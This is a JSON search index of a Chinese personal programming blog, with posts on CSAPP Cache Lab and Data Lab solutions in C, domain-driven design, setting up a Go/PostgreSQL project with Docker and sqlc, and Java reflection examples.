{"pages":[{"title":"","text":"cuzz’s blog由Hexo强力驱动，托管在github，采用next主题","link":"/README.html"},{"title":"404","text":"","link":"/404/index.html"},{"title":"关于","text":"自我介绍联系我： 微信：cuzz_2020 邮箱：cuzz5030@gmail.com","link":"/about/index.html"},{"title":"","text":"","link":"/categories/index.html"},{"title":"","text":"","link":"/tags/index.html"},{"title":"喜欢的图片","text":"冬奥二十四节气图(小糖糖专属) 24 雨水 Rain Water 23 惊蛰 Awakening of Insects 22 春分 Spring Equinox 21 清明 Pure Brighthess 20 谷雨 Grain Rain 19 立夏 Beginning of Summer 18 小满 Grain Buds 17 芒种 Grain in Ear 16 夏至 Summer Solestice 15 小暑 Minor Heat 14 大暑 Major Heat 13 立秋 Beginning of Autumn 12 处暑 End of Heat 11 白露 White Dew 10 秋分 Autumn Equinox 09 寒露 Cold Dew 08 霜降 Frost’s Descent 07 立冬 Beginning of Winter 06 小雪 Minor Snow 05 大雪 Major Snow 04 冬至 Winter Solstice 03 Minor Cold 02 大寒 Major Cold 01 立春 Beginning of Spring 冬奥 图 1 图 2 图 3 图 4","link":"/images/index.html"},{"title":"喜欢的文章","text":"计算机基础计算机系统计算机网络数据库MySQLRedisJava 相关Golang 相关架构设计相关DDD 领域驱动设计 阿里技术专家详解DDD系列 第一讲：Domain Primitive 第二讲：应用架构 第三讲 - Repository模式 第四讲 - 领域层设计规范 第五讲：聊聊如何避免写流水账代码","link":"/likes/index.html"}],"posts":[{"title":"Cache Lab","text":"介绍本实验有两个部分，Part A 要求我们模拟一个 cache 行为，正确地模拟每次操作（如 load、store、modify） cache 的响应（hit、miss、eviction）。Part B 要求我们用尽可能少的 cache 的 miss 实现矩阵的转置，充分利用 cache。 实验说明：地址 Part A在本实验中，需要完成 csim.c 文件，使之编译后实现类似功能： Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;• -h: Optional help flag that prints usage info• -v: Optional verbose flag that displays trace info• -s &lt;s&gt;: Number of set index bits (S = 2sis the number of sets)• -E &lt;E&gt;: Associativity (number of lines per set)• -b &lt;b&gt;: Number of block bits (B = 2bis the block size)• -t &lt;tracefile&gt;: Name of the valgrind trace to replay 要求我们的程序可以手动设置 cache 的 set 数、line 数、block 大小，读取指定的文件内容进行操作，指令类似如下： I 0400d7d4,8M 0421c7f0,4L 04f6b868,8S 7ff0005c8,8 每行代表一个操作，格式: [space]operation address,size I 代表 instruction load, L 代表 data load, S 代表 data store, M 代表 data modify (i.e., a data load followed by a data store) 回顾一下 cahce 具体结构： 具体如下： #include &quot;cachelab.h&quot;#include &lt;getopt.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt;typedef unsigned long int uint64_t;typedef struct { int valid; int lru; uint64_t tag;}cacheLine;typedef cacheLine* cacheSet;typedef cacheSet* Cache;const char* usage = &quot;Usage: %s [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\\n&quot;;int verbose = 0; //verbose flag int s; //number of set index bits int E; //number of lines per setint b; //number of block bitsFILE* fp = NULL;Cache cache;int hits = 0;int misses = 0;int evictions = 0;void parseArgument(int argc, char* argv[]);int visitCache(uint64_t address);int simulate();int main(int argc, char* argv[]){ parseArgument(argc, argv); simulate(); printSummary(hits, misses, evictions); return 0;}void parseArgument(int argc, char* argv[]){ int opt; while ((opt = getopt(argc, argv, &quot;hvs:E:b:t:&quot;)) != -1) { switch(opt) { case 'h': fprintf(stdout, usage, argv[0]); exit(1); case 'v': verbose = 1; break; case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': fp = fopen(optarg, &quot;r&quot;); break; default: fprintf(stdout, usage, argv[0]); exit(1); } }}int simulate(){ int S = pow(2, s); cache = (Cache)malloc(sizeof(cacheSet) * S); if (cache == NULL) return -1; for (int i = 0; i &lt; S; i++) { cache[i] = (cacheSet)calloc(E, sizeof(cacheLine)); if (cache[i] == NULL) return -1; } char buf[20]; char operation; uint64_t address; int size; while (fgets(buf, sizeof(buf), fp) != NULL) { int ret; if (buf[0] == 'I') //ignore instruction cache accesses { continue; } else { sscanf(buf, &quot; %c %lx,%d&quot;, &amp;operation, &amp;address, &amp;size); switch (operation) { case 'S': ret = visitCache(address); break; case 'L': ret = visitCache(address); break; case 'M': ret = visitCache(address); hits++; break; } if (verbose) { switch(ret) { case 0: printf(&quot;%c %lx,%d hit\\n&quot;, operation, address, size); break; case 1: printf(&quot;%c %lx,%d miss\\n&quot;, operation, address, size); break; case 2: printf(&quot;%c %lx,%d miss eviction\\n&quot;, operation, address, size); break; } } } } for (int i = 0; i &lt; S; i++) free(cache[i]); free(cache); fclose(fp); return 0;}/*return value 0 cache hit 1 cache miss 2 cache miss, eviction*/int visitCache(uint64_t address){ uint64_t tag = address &gt;&gt; (s + b); unsigned int setIndex = address &gt;&gt; b &amp; ((1 &lt;&lt; s) - 1); int evict = 0; int empty = -1; cacheSet cacheset = cache[setIndex]; for (int i = 0; i &lt; E; i++) { if (cacheset[i].valid) { if (cacheset[i].tag == tag) { hits++; cacheset[i].lru = 1; return 0; } cacheset[i].lru++; if (cacheset[evict].lru &lt;= cacheset[i].lru) // =是必须的,why? { evict = i; } } else { empty = i; } } //cache miss misses++; if (empty != -1) { cacheset[empty].valid = 1; cacheset[empty].tag = tag; cacheset[empty].lru = 1; return 1; } else { cacheset[evict].tag = tag; cacheset[evict].lru = 1; evictions++; return 2; }} Part B参考总结","link":"/2000/12/13/CSAPP_Cache_Lab/"},{"title":"Data Lab","text":"前言CSAPP 这本书买了好几年，最近抽出一些时间开始重头读这本书，发现这些基础知识比较重要，边看书边跟着视频课程过了一遍，有些东西还是比较模糊。本文开始做 CSAPP Lab 实验，加强巩固书的内容。 说明这个实验主要考察整数和单精度浮点数的表示以及位运算，加强深对对计算机数据表示的理解。 任务指引还是比较清晰的，主要有以下一些说明： 整型的范围是 0 到 255(0xFF)，不允许用更大 只能包含参数和局部变量 一元操作符 ! ~ 二元操作符 &amp; | + &lt;&lt; &gt;&gt; 浮点数可以使用控制语句 题目bitXor/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) { return ~(~(~x &amp; y) &amp; ~(x &amp; ~y));} 异或就是二级制不相等才为1，同时为 0 或者同时为 1，结果为 0 ，比如： 十进制 二进制 4 100 5 101 001 // 异或结果 其中(~x &amp; y) 表示 x 中的 0 和 y 中的 1，(x &amp; ~y)表示 x 中的 1和 y 中的 0，然后通过德·摩根定律~(a &amp; b) = ~a | ~b。 x ^ y = (~x &amp; y) | (x &amp; ~y) = ~(~(~x &amp; y) &amp; ~(x &amp; ~y)) tmin/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) { return 1 &lt;&lt; 31;} 这个题目比较简单，int 有符号采用的是补码表示如图，最小为10000000 00000000 00000000 00000000 我们只需要把 1 往左移动 31 位就行。 isTmax/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) { return !(x + 1 + x + 1) &amp; !!(~x);} 我们发现最大值两倍加二为0，但是要排除 -1（补码全为1）后面!!(~x) 就是这个逻辑。 x 01111111 11111111 11111111 11111111x + 1 10000000 00000000 00000000 00000000x + 1 + x 11111111 11111111 11111111 11111111x + 1 + x + 1 00000000 00000000 00000000 00000000 allOddBits/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) { int e = 0xAA | (0xAA &lt;&lt; 8); e = e | (e &lt;&lt; 16); return !((e &amp; x) ^ e);} 先获取全为奇数位的数，这里的奇数指的是位的阶级是 2 的几次幂。然后取并如果偶数为有值，那么异或之后就不会为0。 // 10101010 10101010 10101010 10101010int a = 0xAA; // 00000000 00000000 00000000 10101010int b = 0xAA &lt;&lt; 8; // 00000000 00000000 10101010 00000000int c = a | b; // 00000000 00000000 10101010 10101010int d = c &lt;&lt; 16; // 10101010 10101010 00000000 00000000int e = c | d; // 10101010 10101010 10101010 10101010 negate/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) { return ~x + 1;} 可以发现取反之后两个之和为 -1，x + ~x = -1，那么-x = ~x + 1然后只需要取反加 1就行， -8 -7 -6 -5 -4 -3 -2 -1 0 1 2 3 4 5 6 71000 1001 1010 1011 1100 1101 1110 1111 0000 0001 0010 0011 0100 0101 0110 0111 0111 1001 0101 0100 0011 0010 0001 0000 1111 1110 1101 1100 1011 1010 1001 1000 7 6 5 4 3 2 1 0 -1 -2 -3 -4 -5 -6 -7 -8 isAsciiDigit/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) { int min = 0x1 &lt;&lt; 31; int max = ~min; int start = ~0x39; int end = max - 0x30 + 1; int c = (x + start) &gt;&gt; 31; int d = (x + end) &gt;&gt; 31; // printf(&quot;x=%d, c=%d, d=%d\\n&quot;,x, c, d); return !!(c &amp; d);} 比如保证 a + start &lt; 0 并且 b + start &lt; 0，然后 a + end &lt; 0 并且 b + end &lt; 0，这个时候是溢出小于零。根据如果 x 为负数x &gt;&gt; 31 = -1，否者 x &gt;&gt; 31 = 0，再通过两次去反获得。 -8 -7 -6 -5 -4 -3 -2 -1 0 1 2 3 4 5 6 71000 1001 1010 1011 1100 1101 1110 1111 0000 0001 0010 0011 0100 0101 0110 0111 a &lt;= x &lt;= b 1 &lt;= x &lt;= 3 2&lt;= x &lt;= 5 start end -4 7 -6 6 -y = ~y + 1start + b = -1 =&gt; start = -1 - b = ~ba + end = max + 1 =&gt; end = max + 1 - a = max - a + 1 conditional/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) { int mask = ~!x + 1; return (y &amp; ~mask) | (z &amp; mask);} 这是一个if-else 语句，我们可以转化为 (y op expr) | (z op expr)，其中 op 为操作符，expr 为表达式。 (y op expr) | (z op expr)x == 0 mask = 0xFFFFFFFx != 0 mask = 0xOOOOOOO isLessOrEqual/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) { int x_sign = (x &gt;&gt; 31) &amp; 0x01; // x 的符号 int y_sign = (y &gt;&gt; 31) &amp; 0x01; // y 的符号 int a = !(x ^ y); int b = (x_sign &amp; (!y_sign)); // 判断是否 x &lt; 0 y &gt; 0 int c = (!((x_sign ^ y_sign) &amp; 0x01)); // 判断符号是否相等 // x - y = x + ~y + 1 int res_sign = ((x + ~y + 1) &gt;&gt; 31) &amp; 0x01;// 判断x-y的符号 return a | b | (c &amp; res_sign);} 用 x - y 通过符号来判断，但是可能会溢出，所以当符号不相同就可以直接判断大小。 x y x - y x &gt; 0 y &gt; 0 正常 x &gt; 0 y &lt; 0 可能向上溢出 x &lt; 0 y &gt; 0 可能向下溢出 x &lt; 0 y &lt; 0 正常 主要分为3部， 看看是否两个数相等 !(x ^ y) 如果相等为1 判断符号是否相反，主要看 x &lt; 0，y &gt; 0 判断符号相等的时候，x - y &lt; 0 logicalNeg/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) { int neg_x = ~x + 1; return ((neg_x | x) &gt;&gt; 31) + 1;} 求 x | -x ，如果 x 不为 0 的化，那么符号位一定为 1，如果 x 为 0 那么符号为0。 howManyBits/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 // 0_1100 * howManyBits(298) = 10 // 0_100101010 * howManyBits(-5) = 4 // 1_101 * howManyBits(0) = 1 // 0 * howManyBits(-1) = 1 // 1 * howManyBits(1) = 2 // 0_1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { int b16, b8, b4, b2, b1, b0; int mask = x &gt;&gt; 31; // 如果x为正数，保持不变；如果为负数，按位取反 x = (mask &amp; ~x) | (~mask &amp; x); // 如果高16位有1，b16 = 16，否者为0 b16 = !!(x &gt;&gt; 16) &lt;&lt; 4; // 如果高16位有1，x右移16位，在新的16为重继续找 x = x &gt;&gt; b16; // 高8 b8 = !!(x &gt;&gt; 8) &lt;&lt; 3; x = x &gt;&gt; b8; // 高4位 b4 = !!(x &gt;&gt; 4) &lt;&lt; 2; x = x &gt;&gt; b4; // 高2位 b2 = !!(x &gt;&gt; 2) &lt;&lt; 1; x = x &gt;&gt; b2; // 高1位 b1 = !!(x &gt;&gt; 1); x = x &gt;&gt; b1; // 底1位 b0 = x; return b16 + b8 + b4 + b2 + b1 + b0 + 1;} 对于正数，找到最左边的 1，对于负数，按位取反处理。 0 1 1 1 0 0 0 1 b4 = 40 1 1 1 b2 = 20 1 b1 = 0 1 b0 = 1 floatScale2/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) { // sign exp frac // 1 8 23 unsigned sign = (uf &gt;&gt; 31) &amp; 0x01; unsigned exp = (uf &gt;&gt; 23) &amp; 0xFF; unsigned frac = uf &amp; 0x7FFFFF; // 特殊 if (exp == 0xFF) { return uf; } // 非规格化 else if (exp == 0) { frac = frac &lt;&lt; 1; return (sign &lt;&lt; 31) | (exp &lt;&lt; 23) | frac; } // 规格化 else { exp ++; return (sign &lt;&lt; 31) | (exp &lt;&lt; 23) | frac; }} 先分别求出 sign ，exp 和 frac，如果是特殊值直接返回，在判断是否是规格化，分别处理。 floatFloat2Int/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) { // sign exp frac // 1 8 23 unsigned sign = (uf &gt;&gt; 31) &amp; 0x01; unsigned exp = (uf &gt;&gt; 23) &amp; 0xFF; unsigned frac_v = uf &amp; 0x7FFFFF; // E = exp - Bias = exp - 127 int E = exp - 127; // 超过范围 if (E &gt;= 31) { return 0x80000000u; } // 小数 if (E &lt; 0) { return 0; } // M = frac + 1; unsigned unsigned_res = (frac_v &gt;&gt; (23 - E)) | (1 &lt;&lt; E); if (sign) { return -unsigned_res; } return unsigned_res;} 把浮点数转化为有符号整数，M = 1 + frac，frac 一共 23 位，左移 23 - E 就获得我们想要的书，但是要加上隐藏的 1，最后根据符号位取相反数就行。 floatPower2/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) { // 非规格化最小值 // 0 00000000 00000000000000000000001 // E = 1 - Bias = 1 - 127 = 126 // frac = 1 * 2^-22 // M = frac // V = 2^E * M = 2^-148 if (x &lt; -148) { return 0; } // 非规格化最大值 // 0 000000 111111111111111111111111 // E = 1 - Bias = 1 - 127 = -126 // frac = 1 (近似,小于) // M = frac // V = 2^E * M = 2^-126 (近似，小于) if (x &lt; -126) { return 1 &lt;&lt; (x + 148); } // 规格化最大值 // 0 11111110 11111111111111111111111 // E = exp - Bias = 254 - 127 = 127 // M = 1 + frac = 1.111111111111111111111111 // V = 2^E * M = 2^128 (近似,小于) if (x &gt;= 128) { return 0xFF &lt;&lt; 23; } // 规格化最小值 // 0 00000001 00000000000000000000000 // E = exp - Bias = 1 - 127 = -126 // M = 1 + frac = 1 // V = 2^E * M = 2^-126 if (x &gt;= -126) { int exp = x + 127; return exp &lt;&lt; 23; } return 0;} 求 2.0^x 的浮点数表示，只要抓住几个边界条件就行。 测试一下最后我们运行一下测试程序，发现都通过了，开心。 总结主要考察整数和单精度浮点数的表示以及位运算，加强深对对计算机数据表示的理解。 参考 CSAPP:Lab1-Data Lab 【读厚 CSAPP】I Data Lab","link":"/2020/10/11/CSAPP_Data_Lab/"},{"title":"DDD领域驱动设计|基础篇","text":"前言DDD 全称为 Domain-Driven Design，中文叫领域驱动设计，是一套应对复杂软件系统分析和设计的面向对象建模方法论。 基本概念DDD 的核心知识体系概念特别多，具体包括：领域、子域、核心域、通用域、支撑域、限界上下文、实体、值对象、聚合和聚合根等概念。 软件架构模式的演进","link":"/2020/08/26/DDD%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"},{"title":"Go项目笔记","text":"前言最近在公司有开始接触 Go 的项目，想系统的学习一下。相对来说 Go 的语法还是比较简单，很容易上手。快速看完两本入门书，想找一些偏项目的书来看，发现目前国内还是比较少。然后翻了一下培训机构的教程，感觉也不是很好，偶然在油管上看到这个教程 Backend master class，感觉讲的不错，就把这个教程整理出来。 介绍这是一个从设计、开发到部署的完整的 Go 项目，使用 PostgreSQL、Golang 和 Docker，这个项目主要来构建一个简单的银行系统，主要提供一下功能： 创建和管理帐户：所有者、余额、货币 记录所有余额变化：为每次更改创建一个帐户条目 转账交易：在一笔交易中，在两个账户之间进行一致的转账 数据库设计设计数据库架构使用 dbdiagram.io 设计表结构，采用的 DSL 语言来定义： Table accounts as A { id bigint [pk, increment, note: '主键'] owner varchar [not null, note: '账户所有者'] balance bigint [not null, note: '账户余额'] currency varchar [not null, note: '货币类型，比如：人民币'] created_at timestamptz [not null, default:`now()`, note: '创建时间'] Indexes { owner } note: '账户'}Table entries { id bigint [pk, increment, note: '主键'] account_id bigint [not null, ref: &gt; A.id, note:'账户id，关联account的id'] amount bigint [not null, note:'变化金额，可正可负'] created_at timestamptz [not null, default:`now()`, note: '创建时间'] Indexes { account_id } note: '记录所有余额变化'}Table transfers { id bigint [pk, increment, note: '主键'] from_account_id bigint [not null, ref: &gt; A.id, note: '转账id'] to_account_id bigint [not null, ref: &gt; A.id, note: '被转账id'] amount bigint [not null, note: '必须为正'] created_at timestamptz [not null, default:`now()`, note: '创建时间'] Indexes { from_account_id to_account_id (from_account_id, to_account_id) } note: '转账交易记录'} 可以生成响应的关系图： 可以导出 PostgreSQL，MySQL等等 还可以创建分享链接，这个表的链接为： https://dbdiagram.io/d/5fcc5ee49a6c525a03b9f27d 使用 Docker 安装 Postgers先安装 docker，可参考网上 先登入 docker 官方，查找可用的镜像，找到一个为 12-alpine，使用 docker pull &lt;image&gt;:&lt;tag&gt; 方式拉去这个镜像 docker pull postgres:12-alpine 输入 docker images 就可看到我们拉去的镜像了 ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpostgres 12-alpine b5a8143fc58d 3 weeks ago 158MB 通过以下格式来运行，我们知道一个镜像（image）可用运行多个容器（container） docker run --name&lt;container_name&gt; // 容器名称 -e &lt;environment_variable&gt; // 环境变量 -p &lt;host_port:containter_ports&gt; // 端口映射 -d &lt;image&gt;:&lt;tag&gt; // 后台运行 运行镜像： docker run --name postgres12 \\ -e POSTGRES_USER=root -e POSTGRES_PASSWORD=12356 \\ -p 5432:5432 \\ -d postgres:12-alpine \\ 使用 docker ps 查看运行的镜像 ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES5c337d6516a6 postgres:12-alpine &quot;docker-entrypoint.s…&quot; About a minute ago Up About a minute 0.0.0.0:5432-&gt;5432/tcp postgres12 在运行的容器中执行命令： docker exec -it &lt;container_name_or_id&gt; &lt;commend&gt; [args] 进入 postgres 命令终端 docker exec -it postgres12 psql -U rootpsql (12.5)Type &quot;help&quot; for help.root=# 使用 DataGrip 连接数据库，并且把生成的 SQL 导入 DataGrip 中，生成相应的表。 SQL/GORM/SQLX/SQLC生成CRUD的比较SQL 快、直接 手动映射 容易写错 GORM CRUD 已经实现了 需要学习一些 gorm 语法 比较慢 SQLX 快，容易使用 通过查询语句和结构体tag映射 SQLC 快，容易使用 自动代码生成 最终我们选择 SQLC，https://github.com/kyleconroy/sqlc 在 mac 上安装 brew install kyleconroy/sqlc/sqlc","link":"/2020/05/06/Go%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/"},{"title":"Java 反射","text":"java 反射 Reflection is a feature in the Java programming language. It allows an executing Java program to examine or “introspect” upon itself, and manipulate internal properties of the program. For example, it’s possible for a Java class to obtain the names of all its members and display them. The ability to examine and manipulate a Java class from within itself may not sound like very much, but in other programming languages this feature simply doesn’t exist. For example, there is no way in a Pascal, C, or C++ program to obtain information about the functions defined within that program. One tangible use of reflection is in JavaBeans, where software components can be manipulated visually via a builder tool. The tool uses reflection to obtain the properties of Java components (classes) as they are dynamically loaded. 类加载器当程序有使用某个类时，如果该类还没有被加载到内存中，则系统会通过加载，连接，初始化三步来实现对这个类进行初始化 加载 就是指将class文件读入内存，并为之创建一个Class对象，任何类被使用时系统都会建立一个Class对象 连接 验证：是否有正确的内部结构，并和其他类协调一致 准备：负责为类的静态成员分配内存，并设置默认初始化值 解析：将类的二进制数据中的符号引用替换为直接引用 初始化 对类的静态变量，静态代码块执行初始化操作 类初始化时机 创建类的实例 类的静态变量，或者为静态变量赋值 类的静态方法 使用反射方式来强制创建某个类或接口对应的java.lang.Class对象 初始化某个类的子类 直接使用java.exe命令来运行某个主类 类加载器作用 负责将.class文件加载到内在中，并为之生成对应的Class对象 虽然我们不需要关心类加载机制，但是了解这个机制我们就能更好的理解程序的运行 类加载器的组成 Bootstrap ClassLoader 根类加载器也被称为引导类加载器，负责Java核心类的加载比如System，String等。在 JDK 中 JRE 的 lib 目录下 rt.jar 文件中 Extension ClassLoader 扩展类加载器负责 JRE 的扩展目录中 jar 包的加载。在 JDK 中 JRE 的 lib 目录下 ext 目录 System ClassLoader 系统类加载器负责在JVM启动时加载来自java命令的class文件，以及classpath环境变量所指定的jar包和类路径 通过这些描述就可以知道我们常用的类，都是由谁来加载完成的。 到目前为止我们已经知道把class文件加载到内存了，那么，如果我们仅仅站在这些class文件的角度，我们如何来使用这些class文件中的内容呢? 这就是我们反射要研究的内容 反射JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。 要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象。 Class类阅读API的Class类得知，Class 没有公共构造方法。Class 对象是在加载类时由 Java 虚拟机以及通过调用类加载器中的 defineClass 方法自动构造的。 获取Class对象的三种方式方式一: 通过Object类中的getObject()方法 Person p = new Person();Class c = p.getClass(); 方式二: 通过 类名.class 获取到字节码文件对象（任意数据类型都具备一个class静态属性,看上去要比第一种方式简单） Class c2 = Person.class; 方式三: 通过Class类中的方法（将类名作为字符串传递给Class类中的静态方法forName即可） Class c3 = Class.forName(&quot;cn.cuzz.Person&quot;); 注意：第三种和前两种的区别 前两种你必须明确Person类型。 后面是指定这种类型的字符串就行(要包含包名)，这种扩展更强，我不需要知道你的类，我只提供字符串，按照配置文件加载就可以了。 Person类public class Person { // 成员变量 public String name; public int age; private String address; // 构造方法 public Person() { System.out.println(&quot;空参数构造方法&quot;); } public Person(String name) { this.name = name; System.out.println(&quot;带有String的构造方法&quot;); } // 私有的构造方法 private Person(String name, int age){ this.name = name; this.age = age; System.out.println(&quot;带有String，int的构造方法&quot;); } public Person(String name, int age, String address){ this.name = name; this.age = age; this.address = address; System.out.println(&quot;带有String, int, String的构造方法&quot;); } // 成员方法 // 没有返回值没有参数的方法 public void method1(){ System.out.println(&quot;没有返回值没有参数的方法&quot;); } // 没有返回值，有参数的方法 public void method2(String name){ System.out.println(&quot;没有返回值，有参数的方法 name= &quot;+ name); } // 有返回值，没有参数 public int method3(){ System.out.println(&quot;有返回值，没有参数的方法&quot;); return 123; } // 有返回值，有参数的方法 public String method4(String name){ System.out.println(&quot;有返回值，有参数的方法&quot;); return &quot;哈哈&quot; + name; } // 私有方法 private void method5(){ System.out.println(&quot;私有方法&quot;); } @Override public String toString() { return &quot;Person [name=&quot; + name + &quot;, age=&quot; + age + &quot;, address=&quot; + address+ &quot;]&quot;; }} 通过反射获取构造方法并使用在反射机制中，把类中的成员（构造方法、成员方法、成员变量）都封装成了对应的类进行表示。其中，构造方法使用类Constructor表示。可通过Class类中提供的方法获取构造方法： 返回一个构造方法 public Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes) 获取public修饰, 指定参数类型所对应的构造方法 public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes) 获取指定参数类型所对应的构造方法(包含私有的) 返回多个构造方法 public Constructor&lt;?&gt;[] getConstructors() 获取所有的public 修饰的构造方法 public Constructor&lt;?&gt;[] getDeclaredConstructors() 获取所有的构造方法(包含私有的) package cn.cuzz;import java.lang.reflect.Constructor;public class Test { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, SecurityException { // 获取Class对象 包名.类 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取所有构造方法 // 只包括public Constructor[] cons = c.getConstructors(); // 即包括public也包括private Constructor[] conss = c.getDeclaredConstructors(); // 获取一个构造方法 // public Person() Constructor con1 = c.getConstructor(null); System.out.println(con1); // public Person(String name) Constructor con2 = c.getConstructor(String.class); System.out.println(con2); // private Person(String name, int age) Constructor con3 = c.getDeclaredConstructor(String.class, int.class); System.out.println(con3); // public Person(String name, int age, String address) Constructor con4 = c.getDeclaredConstructor(String.class, int.class, String.class); System.out.println(con4); }} 通过反射方式，获取构造方法，创建对象获取构造方法，步骤如下： 获取到Class对象 获取指定的构造方法 通过构造方法类Constructor中的方法，创建对象public T newInstance(Object... initargs) package cn.cuzz;import java.lang.reflect.Constructor;public class Test2 { public static void main(String[] args) throws Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取指定构造器 Constructor con = c.getConstructor(String.class, int.class, String.class); // 通过构造方法中的Constructor的方法 创建对象 Object obj = con.newInstance(&quot;cuzz&quot;, 18, &quot;武汉&quot;); System.out.println(obj); // Person [name=cuzz, age=18, address=武汉] }} 通过反射获取成员变量并使用在反射机制中，把类中的成员变量使用类Field表示。可通过Class类中提供的方法获取成员变量： 返回一个成员变量 public Field getField(String name) 获取指定的public修饰的变量 public Field getDeclaredField(String name) 获取指定的任意变量 返回多个成员变量 public Field[] getFields() 获取所有public 修饰的变量 public Field[] getDeclaredFields() 获取所有的 变量 (包含私有) package cn.cuzz;import java.lang.reflect.Field;public class Test3 { public static void main(String[] args) throws Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取多个成员变量 Field[] fields = c.getFields(); Field[] fieldss = c.getDeclaredFields(); // 一个变量 // public int age Field ageField = c.getField(&quot;age&quot;); System.out.println(ageField); // public int cn.cuzz.Person.age // private String address Field addressField = c.getDeclaredField(&quot;address&quot;); System.out.println(addressField); // private java.lang.String cn.cuzz.Person.address }} 通过反射，创建对象，获取指定的成员变量，进行赋值与获取值操作获取成员变量，步骤如下： 获取Class对象 获取构造方法 通过构造方法，创建对象 获取指定的成员变量（私有成员变量，通过setAccessible(boolean flag)方法暴力访问） 通过方法，给指定对象的指定成员变量赋值或者获取值public void set(Object obj, Object value)在指定对象obj中，将此 Field 对象表示的成员变量设置为指定的新值public Object get(Object obj)返回指定对象obj中，此 Field 对象表示的成员变量的值 package cn.cuzz;import java.lang.reflect.Constructor;import java.lang.reflect.Field;public class Test4 { public static void main(String[] args) throws IllegalAccessException, Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取构造方法 Constructor con = c.getConstructor(String.class); // 通过构造方法 创建对象 Object obj = con.newInstance(&quot;cuzz&quot;); // 获取指定成员变量 // public String name Field nameField = c.getField(&quot;name&quot;); // public int age Field ageField = c.getField(&quot;age&quot;); // 赋值 nameField.set(obj, &quot;Cuzz&quot;); ageField.set(obj, 23); System.out.println(&quot;name = &quot;+ nameField.get(obj)); // name = Cuzz System.out.println(&quot;age = &quot;+ ageField.get(obj)); // age = 23 }} 